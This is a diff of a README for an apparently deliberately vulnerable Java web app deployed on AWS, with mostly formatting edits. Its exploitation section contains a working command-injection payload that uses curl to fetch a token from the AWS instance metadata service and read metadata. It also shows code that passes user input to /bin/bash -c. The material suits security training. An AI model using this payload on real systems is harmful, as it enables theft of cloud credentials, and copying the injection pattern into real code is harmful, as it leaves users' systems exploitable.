@@ -37,8 +37,7 @@ If deploying in AWS I recommend deploying to an Amazon Linux instance (this is w
 Either use the app as standalone with `mvn jetty:run` or deploy as part of an AWS code pipeline.
 
 Note that AWS requires some specific syntax to invoke long running commands as part of a deployment, hence the
-`mvn jetty:run> /dev/null 2> /dev/null < /dev/null &` in start.sh
-
+`mvn jetty:run> /dev/null 2> /dev/null < /dev/null &` in `start.sh`
 
 ## Exploitation
 
@@ -51,7 +50,7 @@ A couple of ways to exploit the app:
 
 **SSRF exploit:**
 
-```google.com && TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/ > output && cat output```
+```google.com && TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/```
 
 
 
@@ -67,7 +66,7 @@ if (command != null && !command.isEmpty()) {
   String result = executeCommand(fullCommand);
 ```
 
-And then pass it to bash....
+And then pass it to bash in executeCommand:
 
 ```Process process = new ProcessBuilder("/bin/bash", "-c", command).start();```
 
